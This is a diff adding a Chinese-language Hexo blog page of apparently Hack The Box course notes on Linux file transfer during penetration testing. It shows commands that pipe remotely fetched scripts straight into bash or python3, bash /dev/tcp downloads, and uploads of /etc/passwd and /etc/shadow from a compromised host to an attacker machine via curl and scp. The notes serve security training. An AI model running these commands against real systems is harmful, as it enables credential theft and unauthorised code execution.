@@ -1,0 +1,424 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || Linux_File_Transfer</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Linux_File_Transfer </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/7/6
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/base" style=color:#ff7d73>
+                    base
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h2 id="Web-Downloads-with-Wget-and-cURL"><a href="#Web-Downloads-with-Wget-and-cURL" class="headerlink" title="Web Downloads with Wget and cURL"></a>Web Downloads with Wget and cURL</h2><p>Linux发行版中与web应用程序交互的两个最常见的实用程序是wget和curl。这些工具安装在许多Linux发行版上。 要使用wget下载文件，我们需要指定URL和选项“-O”来设置输出文件名。</p>
+<span id="more"></span>
+
+
+
+<h4 id="Download-a-File-Using-wget"><a href="#Download-a-File-Using-wget" class="headerlink" title="Download a File Using wget"></a>Download a File Using wget</h4><pre><code class="shell-session">Tanin@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+</code></pre>
+<p>cURL与wget非常相似，但输出文件名选项是小写的“-o”。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+</code></pre>
+<h2 id="Fileless-Attacks-Using-Linux"><a href="#Fileless-Attacks-Using-Linux" class="headerlink" title="Fileless Attacks Using Linux"></a>Fileless Attacks Using Linux</h2><p>由于Linux的工作方式和管道的操作方式，我们在Linux中使用的大多数工具都可以用于复制无文件操作，这意味着我们不必下载文件来执行它。</p>
+<p>注意：一些有效负载（如mkfifo）会将文件写入磁盘。请记住，虽然使用管道时有效负载的执行可能是无文件的，但根据所选的有效负载，它可能会在操作系统上创建临时文件。</p>
+<p>让我们使用我们使用的cURL命令，而不是下载LinEnum.sh，让我们使用管道直接执行它。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+</code></pre>
+<p>类似地，我们可以从web服务器下载一个Python脚本文件，并将其管道传输到Python二进制文件中。让我们这样做，这次使用wget。</p>
+<h4 id="Fileless-Download-with-wget"><a href="#Fileless-Download-with-wget" class="headerlink" title="Fileless Download with wget"></a>Fileless Download with wget</h4><pre><code class="shell-session">Tanin@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+
+Hello World!
+</code></pre>
+<ul>
+<li><code>wget -qO- &lt;URL&gt;</code>：使用 <code>wget</code> 命令下载指定 URL 的文件，并将其输出到标准输出（stdout）而不保存到文件。<code>-q</code> 参数表示静默模式，不显示下载进度信息，<code>-O-</code> 参数指定将文件内容输出到 stdout。</li>
+<li><code>|</code>：管道操作符，将前一个命令的输出作为后一个命令的输入。</li>
+<li><code>python3</code>：Python 3 解释器，用于执行从标准输入接收到的 Python 代码。</li>
+</ul>
+<h2 id="Download-with-Bash-x2F-dev-x2F-tcp"><a href="#Download-with-Bash-x2F-dev-x2F-tcp" class="headerlink" title="Download with Bash (&#x2F;dev&#x2F;tcp)"></a>Download with Bash (&#x2F;dev&#x2F;tcp)</h2><p>也可能存在没有任何已知的文件传输工具可用的情况。只要安装了Bash 2.04或更高版本（使用–enable net redirections编译），内置的&#x2F;dev&#x2F;TCP设备文件就可以用于简单的文件下载。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ exec 3&lt;&gt;/dev/tcp/10.10.10.32/80
+</code></pre>
+<h4 id="Connect-to-the-Target-Webserver"><a href="#Connect-to-the-Target-Webserver" class="headerlink" title="Connect to the Target Webserver"></a>Connect to the Target Webserver</h4><ul>
+<li><code>exec 3&lt;&gt;/dev/tcp/10.10.10.32/80</code>：<code>exec</code> 是 Bash 的一个内置命令，用于执行重定向或替换文件描述符等操作。在这里，它将文件描述符 3（可以是任何可用的未使用文件描述符）与指定的 IP 地址和端口号上的 TCP 连接相关联。</li>
+<li><code>/dev/tcp/10.10.10.32/80</code>：<code>/dev/tcp/</code> 是 Bash 的特殊设备文件路径之一，可以用于与 TCP 服务器建立连接。在这里，它表示与 IP 地址为 <code>10.10.10.32</code>，端口号为 <code>80</code> 的服务器建立连接。</li>
+</ul>
+<h4 id="HTTP-GET-Request"><a href="#HTTP-GET-Request" class="headerlink" title="HTTP GET Request"></a>HTTP GET Request</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo -e &quot;GET /LinEnum.sh HTTP/1.1\n\n&quot;&gt;&amp;3
+</code></pre>
+<h4 id="Print-the-Response"><a href="#Print-the-Response" class="headerlink" title="Print the Response"></a>Print the Response</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat &lt;&amp;3
+</code></pre>
+<h2 id="SSH-Downloads"><a href="#SSH-Downloads" class="headerlink" title="SSH Downloads"></a>SSH Downloads</h2><p>SSH（或Secure Shell）是一种允许安全访问远程计算机的协议。SSH实现附带了一个用于远程文件传输的SCP实用程序，默认情况下，该实用程序使用SSH协议。 SCP（安全复制）是一种命令行实用程序，允许您在两个主机之间安全地复制文件和目录。我们可以将文件从本地服务器复制到远程服务器，也可以从远程服务器复制到本地机器。 SCP与copy或cp非常相似，但我们需要指定用户名、远程IP地址或DNS名称以及用户的凭据，而不是提供本地路径。 在我们开始将文件从目标Linux机器下载到Pwnbox之前，让我们在Pwnbox中设置一个SSH服务器。</p>
+<h4 id="Enabling-the-SSH-Server"><a href="#Enabling-the-SSH-Server" class="headerlink" title="Enabling the SSH Server"></a>Enabling the SSH Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo systemctl enable ssh
+
+Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
+Executing: /lib/systemd/systemd-sysv-install enable ssh
+Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, &lt;DATA&gt; line 45
+...SNIP...
+</code></pre>
+<h4 id="Starting-the-SSH-Server"><a href="#Starting-the-SSH-Server" class="headerlink" title="Starting the SSH Server"></a>Starting the SSH Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo systemctl start ssh
+</code></pre>
+<h4 id="Checking-for-SSH-Listening-Port"><a href="#Checking-for-SSH-Listening-Port" class="headerlink" title="Checking for SSH Listening Port"></a>Checking for SSH Listening Port</h4><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -lnpt
+
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
+</code></pre>
+<p>现在我们可以开始传输文件了。我们需要指定我们Pwnbox的IP地址以及用户名和密码。</p>
+<h4 id="Linux-Downloading-Files-Using-SCP"><a href="#Linux-Downloading-Files-Using-SCP" class="headerlink" title="Linux - Downloading Files Using SCP"></a>Linux - Downloading Files Using SCP</h4><pre><code class="shell-session">Tanin@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
+</code></pre>
+<p>注意：您可以为文件传输创建临时用户帐户，并避免在远程计算机上使用主凭据或密钥。</p>
+<h2 id="Upload-Operations"><a href="#Upload-Operations" class="headerlink" title="Upload Operations"></a>Upload Operations</h2><p>还有一些情况，如二进制利用和数据包捕获分析，我们必须将文件从目标机器上传到攻击主机上。我们用于下载的方法也适用于上传。让我们看看如何以各种方式上传文件。</p>
+<h2 id="Web-Upload"><a href="#Web-Upload" class="headerlink" title="Web Upload"></a>Web Upload</h2><p>正如在Windows文件传输方法部分中提到的，我们可以使用uploadserver，这是Python HTTP.Server模块的扩展模块，其中包括一个文件上传页面。对于这个Linux示例，让我们看看如何将uploadserver模块配置为使用HTTPS进行安全通信。 我们需要做的第一件事是安装uploadserver模块。</p>
+<h4 id="Pwnbox-Start-Web-Server"><a href="#Pwnbox-Start-Web-Server" class="headerlink" title="Pwnbox - Start Web Server"></a>Pwnbox - Start Web Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -m pip install --user uploadserver
+
+Collecting uploadserver
+  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
+Installing collected packages: uploadserver
+Successfully installed uploadserver-2.0.1
+</code></pre>
+<ul>
+<li><code>python3</code>：指定要使用的 Python 版本，这里是 Python 3。</li>
+<li><code>-m pip</code>：使用 Python 的 <code>pip</code> 模块来执行包的安装操作。</li>
+<li><code>install</code>：告诉 <code>pip</code> 安装一个包。</li>
+<li><code>--user</code>：将包安装到当前用户的本地目录，而不是系统级别的目录。这可以确保您的安装不会影响其他用户或需要管理员权限。</li>
+<li><code>uploadserver</code>：要安装的包的名称，这里是 <code>uploadserver</code>。</li>
+</ul>
+<p>现在我们需要创建一个证书。在本例中，我们使用的是自签名证书。</p>
+<h4 id="Pwnbox-Create-a-Self-Signed-Certificate"><a href="#Pwnbox-Create-a-Self-Signed-Certificate" class="headerlink" title="Pwnbox - Create a Self-Signed Certificate"></a>Pwnbox - Create a Self-Signed Certificate</h4><pre><code class="shell-session">Tanin@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj &#39;/CN=server&#39;
+
+Generating a RSA private key
+................................................................................+++++
+.......+++++
+writing new private key to &#39;server.pem&#39;
+-----
+</code></pre>
+<ul>
+<li><code>req</code>: OpenSSL 的子命令，用于处理证书签发请求。</li>
+<li><code>-x509</code>: 生成自签名的 X.509 证书。</li>
+<li><code>-out server.pem</code>: 指定生成的证书的输出路径和文件名。</li>
+<li><code>-keyout server.pem</code>: 指定生成的私钥的输出路径和文件名。</li>
+<li><code>-newkey rsa:2048</code>: 创建一个新的 RSA 密钥对，密钥长度为 2048 位。</li>
+<li><code>-nodes</code>: 生成的私钥不加密（无密码）。</li>
+<li><code>-sha256</code>: 使用 SHA-256 哈希算法生成证书请求的摘要。</li>
+<li><code>-subj &#39;/CN=server&#39;</code>: 指定证书的主题（Subject），在这里是 Common Name (CN) 设置为 “server”。</li>
+</ul>
+<h4 id="Pwnbox-Start-Web-Server-1"><a href="#Pwnbox-Start-Web-Server-1" class="headerlink" title="Pwnbox - Start Web Server"></a>Pwnbox - Start Web Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -m uploadserver 443 --server-certificate /root/server.pem
+
+File upload available at /upload
+Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
+</code></pre>
+<p>现在，让我们从受损的机器上传&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow文件。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F &#39;files=@/etc/passwd&#39; -F &#39;files=@/etc/shadow&#39; --insecure
+</code></pre>
+<p>我们使用了不安全的选项，因为我们使用了我们信任的自签名证书。</p>
+<h2 id="Alternative-Web-File-Transfer-Method"><a href="#Alternative-Web-File-Transfer-Method" class="headerlink" title="Alternative Web File Transfer Method"></a>Alternative Web File Transfer Method</h2><p>由于Linux发行版通常安装了Python或php，因此启动web服务器传输文件非常简单。此外，如果我们泄露的服务器是网络服务器，我们可以将要传输的文件移动到网络服务器目录，并从网页访问它们，这意味着我们正在从我们的Pwnbox下载文件。 可以使用各种语言来建立web服务器。受损的Linux计算机可能没有安装web服务器。在这种情况下，我们可以使用迷你网络服务器。它们可能缺乏安全性，但它们弥补了灵活性，因为webroot位置和侦听端口可以快速更改。</p>
+<h4 id="Linux-Creating-a-Web-Server-with-Python3"><a href="#Linux-Creating-a-Web-Server-with-Python3" class="headerlink" title="Linux - Creating a Web Server with Python3"></a>Linux - Creating a Web Server with Python3</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 -m http.server
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+<h4 id="Linux-Creating-a-Web-Server-with-Python2-7"><a href="#Linux-Creating-a-Web-Server-with-Python2-7" class="headerlink" title="Linux - Creating a Web Server with Python2.7"></a>Linux - Creating a Web Server with Python2.7</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python2.7 -m SimpleHTTPServer
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+<h4 id="Linux-Creating-a-Web-Server-with-PHP"><a href="#Linux-Creating-a-Web-Server-with-PHP" class="headerlink" title="Linux - Creating a Web Server with PHP"></a>Linux - Creating a Web Server with PHP</h4><pre><code class="shell-session">Tanin@htb[/htb]$ php -S 0.0.0.0:8000
+
+[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
+</code></pre>
+<h4 id="Linux-Creating-a-Web-Server-with-Ruby"><a href="#Linux-Creating-a-Web-Server-with-Ruby" class="headerlink" title="Linux - Creating a Web Server with Ruby"></a>Linux - Creating a Web Server with Ruby</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ruby -run -ehttpd . -p8000
+
+[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
+[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
+[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
+</code></pre>
+<h4 id="Download-the-File-from-the-Target-Machine-onto-the-Pwnbox"><a href="#Download-the-File-from-the-Target-Machine-onto-the-Pwnbox" class="headerlink" title="Download the File from the Target Machine onto the Pwnbox"></a>Download the File from the Target Machine onto the Pwnbox</h4><pre><code class="shell-session">Tanin@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
+</code></pre>
+<h2 id="SCP-Upload"><a href="#SCP-Upload" class="headerlink" title="SCP Upload"></a>SCP Upload</h2><p>我们可能会发现一些公司允许SSH协议（TCP&#x2F;22）用于出站连接，如果是这样的话，我们可以使用带有scp实用程序的SSH服务器来上传文件。让我们尝试使用SSH协议上传一个文件。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
+
+plaintext@192.168.49.128&#39;s password: 
+passwd              
+</code></pre>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
